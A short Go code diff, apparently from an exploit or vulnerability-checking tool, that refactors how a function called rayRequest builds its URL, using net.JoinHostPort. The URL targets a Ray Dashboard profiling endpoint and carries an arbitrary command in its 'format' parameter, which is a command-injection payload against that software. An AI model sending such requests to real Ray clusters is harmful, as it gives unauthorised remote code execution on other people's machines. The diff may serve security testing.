@@ -24,6 +24,7 @@ import (
 	"fmt"
 	"io/fs"
 	"math/rand"
+	"net"
 	"net/http"
 	"os"
 	"strconv"
@@ -196,7 +197,7 @@ func attemptExploit(ctx context.Context) string {
 
 // rayRequest sends an HTTP GET request to the Ray Dashboard and executes the provided command
 func rayRequest(ctx context.Context, host string, port int, cmd string) int {
-	url := fmt.Sprintf("http://%s:%d/worker/cpu_profile?pid=3354&ip=127.0.0.1&duration=5&native=0&format=%s", host, port, cmd)
+	url := fmt.Sprintf("http://%s/worker/cpu_profile?pid=3354&ip=127.0.0.1&duration=5&native=0&format=%s", net.JoinHostPort(host, strconv.Itoa(port)), cmd)
 
 	// Create a new HTTP request
 	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
